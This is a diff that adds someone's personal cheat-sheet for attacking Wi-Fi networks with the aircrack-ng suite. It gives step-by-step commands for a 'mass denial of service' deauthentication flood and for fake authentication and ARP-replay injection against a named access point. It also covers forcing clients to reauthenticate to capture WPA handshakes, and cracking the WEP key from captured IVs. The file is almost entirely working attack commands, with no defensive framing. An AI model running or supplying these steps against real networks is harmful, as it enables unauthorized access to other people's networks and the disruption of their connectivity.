@@ -1,0 +1,95 @@
+# my mac
+mon0 00:21:5c:72:a8:df
+
+#mass denial of sevice attach 
+aireplay-ng -0 0 -a 00:A0:B0:40:5C:84 eth0
+
+apt-get install aircrack-ng
+sudo service network-manager (stop|start)
+or rightclick NetworkManager and disable wireless
+
+
+#== WEP ==
+#
+#my MAC
+00:21:5c:72:a8:df
+#old-spock MAC
+00:11:95:41:AA:D9
+
+#scan 
+iwlist wlan0 scan
+
+#prepare NIC for packet injection (maybe set options in /etc/modprobe.d/
+modprobe iwlagn "swcrypto=1" "disable_hw_scan=1"
+
+#test for wireless card ability to inject packets
+aireplay-ng -9 wlan0
+
+#stop wlan0
+airmon-ng stop wlan0
+
+#start in monitor mode on channel 1
+airmon-ng start wlan0 1
+
+#monitor traffic
+airodump-ng mon0
+
+#run iwconfig to confirm Mode:Monitor
+
+#make sure access point is within range and can inject packets
+#MAC address is for AP 
+#-9 is test
+#-e <ESSID>
+#make sure response has high percentage, or to far away (-a is AP MAC, -9 is injection test)
+
+aireplay-ng -9 -e old-spock -a 00:11:95:41:AA:D9 mon0 
+
+==
+#open another session to capture generated IVs
+#where -c is channel
+#--bssid is AP MAC
+#-w <path/to/file> that contains IVs
+
+airodump-ng -c 1 --bssid 00:11:95:41:AA:D9 -w output mon0
+
+#WPA - Capture WPA handshakes by forcing clients to reauthenticate, doesn't work if there's no assoc. clients
+aireplay-ng -0 5 -a 00:11:95:41:AA:D9 -c 00:21:5c:72:a8:df mon0 
+
+
+#ARP request if above doesn't work
+aireplay-ng -0 10 -a 00:11:95:41:AA:D9 mon0
+aireplay-ng -3 -b 00:11:95:41:AA:D9 -h 00:21:5c:72:a8:df mon0 
+
+
+
+#start fake authentication (can't inject IV's if MAC address isn't associtated)
+#-1 means fake authentication, 0 reassociation timing in seconds,
+#-a is the access point MAC address, -h is our card MAC address
+aireplay-ng -1 0 -e old-spock -a 00:11:95:41:AA:D9 -h 00:21:5c:72:a8:df mon0
+
+
+#or for pick access points
+#6000 - Reauthenticate every 6000 seconds. The long period also causes keep alive packets to be sent
+#-o 1 - Send only one set of packets at a time. Default is multiple and this confuses some APs.
+#-q 10 - Send keep alive packets every 10 seconds
+aireplay-ng -1 6000 -o 1 -q 10 -e old-spock -a 00:11:95:41:AA:d9 -h 00:21:5c:72:a8:df mon0
+
+
+#debugging, 
+
+tcpdump -n -vvv -s0 -e -i <interface name> | grep -i -E ”(RA:<MAC address of your card>|Authentication|ssoc)”
+
+#confirm association (look for not associated)
+tcpdump -n -e -s0 -vvv -i mon0
+
+
+#listen for ARP requests, then reinject them, AP should rebroadcast and generate a new IV
+#-b is access point MAC
+aireplay-ng -3 -b 00:11:95:41:AA:d9 -h 00:21:5c:72:a8:df mon0
+
+
+#from another console crack the WEP
+aircrack-ng -b 00:11:95:41:AA:d9 output*.cap
+
+
+
